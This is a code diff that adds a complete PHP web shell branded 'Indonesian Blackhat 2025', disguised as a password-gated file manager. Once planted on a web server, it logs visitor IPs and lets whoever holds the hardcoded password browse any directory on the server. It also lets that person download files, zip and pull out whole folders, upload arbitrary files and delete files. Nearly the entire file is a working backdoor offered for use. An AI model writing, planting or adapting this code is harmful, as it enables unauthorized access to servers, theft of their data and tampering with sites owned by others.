@@ -1,0 +1,191 @@
+<?php
+session_start();
+$password_benar = "indonesianblackhat2025";
+$log_file = 'log.txt';
+
+// IP & time
+file_put_contents($log_file, "[" . date('Y-m-d H:i:s') . "] IP: " . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
+
+// Bypass all authority
+if (!isset($_SESSION['login_time'])) {
+    $_SESSION['login_time'] = time();
+} elseif (time() - $_SESSION['login_time'] > 45) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if ($_POST['password'] === $password_benar) {
+            $_SESSION['login'] = true;
+            $_SESSION['login_time'] = time(); // Reset 
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            echo "<script>alert('Ngapain Pak?');</script>";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Blackhat International</title>
+        <style>
+            body { background: #282c34; color: #61dafb; font-family: 'Courier New', monospace; padding: 50px; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
+            input, button { background: #21252b; color: #61dafb; border: 1px solid #61dafb; padding: 10px; margin: 5px; font-size: 16px; border-radius: 5px; }
+            button:hover { background: #61dafb; color: #21252b; cursor: pointer; }
+            .login-container { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+            h2 { text-align: center; font-size: 30px; }
+            .logo { width: 80px; margin-bottom: 20px; }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <img src="https://infocon.org/cons/Black%20Hat/Black%20Hat%20Logo%20small.jpg" alt="Logo Bumi" class="logo">
+            <h2>International of Indonesian Blackhat 2025</h2>
+            <form method="post">
+                <label for="password">Password:</label>
+                <input type="password" name="password" id="password" required>
+                <div style="margin-top:5px; color: #0ff;">Indonesian Blackhat International by Jember Blackhat Group. <br><br>(www.jemberblackhat.asia)</div><br>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Jayalah Indonesiaku
+function zipFolder($source, $destination) {
+    $zip = new ZipArchive();
+    if (!$zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE)) return false;
+
+    $source = realpath($source);
+    if (is_dir($source)) {
+        $iterator = new RecursiveDirectoryIterator($source);
+        foreach (new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST) as $file) {
+            if ($file->isDir()) continue;
+            $filePath = $file->getRealPath();
+            $relativePath = substr($filePath, strlen($source) + 1);
+            $zip->addFile($filePath, $relativePath);
+        }
+    }
+    return $zip->close();
+}
+
+// Navigasi direktori bebas
+$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+if (!is_dir($currentDir)) $currentDir = getcwd();
+
+// Delete file
+if (isset($_GET['delete'])) {
+    $del = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
+    if (is_file($del)) unlink($del);
+    header("Location: ?dir=" . urlencode($currentDir));
+    exit;
+}
+
+// Download file
+if (isset($_GET['download']) && is_file($currentDir . DIRECTORY_SEPARATOR . $_GET['download'])) {
+    $file = $currentDir . DIRECTORY_SEPARATOR . $_GET['download'];
+    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+    header('Content-Type: application/octet-stream');
+    readfile($file);
+    exit;
+}
+
+// Zip folder
+if (isset($_GET['zip']) && is_dir($currentDir . DIRECTORY_SEPARATOR . $_GET['zip'])) {
+    $folder = $currentDir . DIRECTORY_SEPARATOR . $_GET['zip'];
+    $zipPath = $currentDir . DIRECTORY_SEPARATOR . basename($folder) . ".zip";
+    zipFolder($folder, $zipPath);
+    header('Content-Disposition: attachment; filename="' . basename($zipPath) . '"');
+    header('Content-Type: application/zip');
+    readfile($zipPath);
+    unlink($zipPath);
+    exit;
+}
+
+// Upload file
+if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
+    $uploadedFile = $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['file_upload']['name']);
+    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadedFile)) {
+        echo "<script>alert('File berhasil di-upload!');</script>";
+    } else {
+        echo "<script>alert('Gagal meng-upload file.');</script>";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>International Blackhat</title>
+    <style>
+        body { background: #282c34; color: #61dafb; font-family: 'Courier New', monospace; padding: 20px; }
+        a { color: #0ff; text-decoration: none; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        td, th { border: 1px solid #0f0; padding: 8px; text-align: left; }
+        input, button { background: #21252b; color: #61dafb; border: 1px solid #61dafb; padding: 8px; margin: 5px; font-size: 16px; border-radius: 5px; }
+        button:hover { background: #61dafb; color: #21252b; }
+        .about-box { background: #21252b; border: 1px solid #61dafb; padding: 10px; color: #61dafb; margin-top: 10px; text-align: center; }
+        .logo-container { text-align: center; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<!-- Jayalah Indonesiaku -->
+<div class="logo-container">
+ Â   <img src="https://res.cloudinary.com/cyberranmedia/images/f_auto,q_auto/v1683110338/wordpress_bulk/blackhat-logo-2019/blackhat-logo-2019.webp?_i=AA" alt="Jayalah Indonesiaku" width="100">
+</div>
+
+<h2>ðŸ“ Direktori: <?= htmlspecialchars($currentDir) ?></h2>
+
+<form method="get">
+    <label>ðŸ“‚ Ganti Direktori:</label>
+    <input type="text" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
+    <button type="submit">Go</button>
+</form>
+
+<h3>Upload File</h3>
+<form method="post" enctype="multipart/form-data">
+    <input type="file" name="file_upload">
+    <button type="submit">Upload</button>
+</form>
+
+<!-- About -->
+<div class="about-box">
+    <button onclick="alert('Blackhat International Indonesia is dedicated to the celebration of black hat security in the jember blachat community group, Keep on being a security whore, Lmao. Special : Anon6host, Montenk666, RLX-06 and God. Contact : fb.com/jemberblackhatofficial')">www.jemberblackhat.asia</button>
+</div>
+
+<table>
+    <tr>
+        <th>Nama</th>
+        <th>Tipe</th>
+        <th>Ukuran</th>
+        <th>Aksi</th>
+    </tr>
+    <?php foreach (scandir($currentDir) as $item): ?>
+        <?php if ($item === ".") continue; ?>
+        <?php $path = $currentDir . DIRECTORY_SEPARATOR . $item; ?>
+        <tr>
+            <td><?= is_dir($path) ? "ðŸ“" : "ðŸ“„" ?> <?= htmlspecialchars($item) ?></td>
+            <td><?= is_dir($path) ? "Folder" : "File" ?></td>
+            <td><?= is_file($path) ? filesize($path) . ' B' : '-' ?></td>
+            <td>
+                <?php if (is_file($path)): ?>
+                    <a href="?dir=<?= urlencode($currentDir) ?>&download=<?= urlencode($item) ?>">Unduh</a> |
+                    <a href="?dir=<?= urlencode($currentDir) ?>&delete=<?= urlencode($item) ?>" onclick="return confirm('Hapus file ini?')">Hapus</a>
+                <?php elseif (is_dir($path)): ?>
+                    <a href="?dir=<?= urlencode($path) ?>">Masuk</a> |
+                    <a href="?dir=<?= urlencode($currentDir) ?>&zip=<?= urlencode($item) ?>">Unduh ZIP</a>
+                <?php endif; ?>
+            </td>
+        </tr>
+    <?php endforeach; ?>
+</table>
+
+</body>
+</html>
